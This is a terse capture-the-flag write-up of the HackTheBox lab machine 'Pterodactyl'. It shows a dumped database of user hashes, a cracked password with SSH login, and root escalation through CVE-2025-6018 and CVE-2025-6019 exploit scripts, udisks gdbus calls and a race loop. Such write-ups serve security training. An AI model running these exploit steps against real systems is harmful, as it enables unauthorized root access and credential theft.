---
tags:
title: Pterodactyl - Medium (HTB)
permalink: /Pterodactyl-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 

```

```bash
ariaDB [panel]> select * from users;
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
2 rows in set (0.000 sec)
```

```bash
zs1n@ptw ~> j hyash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
1g 0:00:00:59 DONE (2026-03-20 18:14) 0.01678g/s 233.2p/s 233.2c/s 233.2C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


```bash
zs1n@ptw ~> ssh phileasfogg3@pterodactyl.htb
The authenticity of host 'pterodactyl.htb (10.129.10.50)' can't be established.
ED25519 key fingerprint is: SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pterodactyl.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password:
Have a lot of fun...
Last login: Sat Mar 21 00:14:06 2026 from 10.10.16.214
phileasfogg3@pterodactyl:~> cat user.txt
0a41adad8058d3466af3868f0e255004
```


```bash
phileasfogg3@pterodactyl:/var/spool/mail> cat phileasfogg3
From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
Received: by pterodactyl (Postfix, from userid 0)
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Message-ID: 202511070915.headmonitor@pterodactyl
Date: Fri, 07 Nov 2025 09:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator\
```

```bash
zs1n@ptw ~> sudo bash exploit.sh
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
[+] All dependencies are installed.
[*] Checking for vulnerable libblockdev/udisks versions...
[*] Detected udisks version: unknown
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
[!] Continuing with PoC execution...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): L
[*] Creating a 300 MB XFS image on local machine...
234881024 bytes (235 MB, 224 MiB) copied, 5 s, 46.9 MB/s
300+0 records in
300+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 5.95244 s, 52.8 MB/s
meta-data=./xfs.image            isize=512    agcount=4, agsize=19200 blks
         =                       sectsz=512   attr=2, projid32bit=1
         =                       crc=1        finobt=1, sparse=1, rmapbt=1
         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1
         =                       exchange=1   metadir=0
data     =                       bsize=4096   blocks=76800, imaxpct=25
         =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1, parent=1
log      =internal log           bsize=4096   blocks=16384, version=2
         =                       sectsz=512   sunit=0 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
         =                       rgcount=0    rgsize=0 extents
         =                       zoned=0      start=0 reserved=0
[+] 300 MB XFS image created: ./xfs.image
[*] Transfer to target with: scp xfs.image <user>@<host>:
```

```bash
zs1n@ptw ~> scp xfs.image phileasfogg3@pterodactyl.htb:
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password:
xfs.image
```


```bash
zs1n@ptw ~> python3 CVE-2025-6018/CVE-2025-6018.py -i 10.129.10.50 -u phileasfogg3 -p '!QAZ2wsx'
2026-03-20 18:19:49 [WARNING] Use only with proper authorization!
2026-03-20 18:19:49 [INFO] Starting CVE-2025-6018 exploit against 10.129.10.50:22
2026-03-20 18:19:49 [INFO] Connecting to 10.129.10.50:22 as phileasfogg3
2026-03-20 18:19:49 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-03-20 18:19:52 [INFO] Authentication (password) successful!
2026-03-20 18:19:52 [INFO] SSH connection established
2026-03-20 18:19:52 [INFO] Starting vulnerability assessment
2026-03-20 18:19:52 [INFO] Executing check: pam_version
2026-03-20 18:19:53 [INFO] Vulnerable PAM version detected: pam-1.3.0
2026-03-20 18:19:53 [INFO] Executing check: pam_env
2026-03-20 18:19:54 [INFO] pam_env.so configuration found
2026-03-20 18:19:55 [INFO] Executing check: pam_systemd
2026-03-20 18:19:56 [INFO] pam_systemd.so found - escalation vector available
2026-03-20 18:19:56 [INFO] Executing check: systemd_version
2026-03-20 18:19:58 [INFO] Target appears vulnerable, proceeding with exploitation
2026-03-20 18:19:58 [INFO] Creating malicious environment file
2026-03-20 18:19:58 [INFO] Writing .pam_environment file
2026-03-20 18:19:59 [INFO] Malicious environment file created successfully
2026-03-20 18:19:59 [INFO] Reconnecting to trigger PAM environment loading
2026-03-20 18:20:02 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-03-20 18:20:04 [INFO] Authentication (password) successful!
2026-03-20 18:20:04 [INFO] Reconnection successful
2026-03-20 18:20:04 [INFO] Testing privilege escalation vectors
2026-03-20 18:20:04 [INFO] Testing: SystemD Reboot
2026-03-20 18:20:05 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot
2026-03-20 18:20:05 [INFO] Testing: SystemD Shutdown
2026-03-20 18:20:06 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown
2026-03-20 18:20:06 [INFO] Testing: PolicyKit Check
2026-03-20 18:20:07 [INFO] No escalation detected: PolicyKit Check
2026-03-20 18:20:07 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed
2026-03-20 18:20:07 [INFO] Starting interactive shell session
```

```bash
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

borrar el cheque de dependencia

```bash
cd /tmp/CVE-2025-6019; (echo "y"; echo "C") | ./exploit.sh
```

```bash
while true; do for d in /tmp/blockdev.*; do if [ -f "$d/xpl" ]; then echo "Gotcha" "$d/xpl" break 2 fi done done

(sleep 5 && gdbus call --system \ --dest org.freedesktop.UDisks2 \ --object-path /org/freedesktop/UDisks2/block_devices/loop1 \ --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}") &
```

```bash
phileasfogg3@pterodactyl:~> export MY_LOOP=$(udisksctl loop-setup --file ~/xfs.image | grep -o '/dev/loop[0-9]*')
phileasfogg3@pterodactyl:~> echo "Mi dispositivo es: $MY_LOOP"
Mi dispositivo es: /dev/loop1
```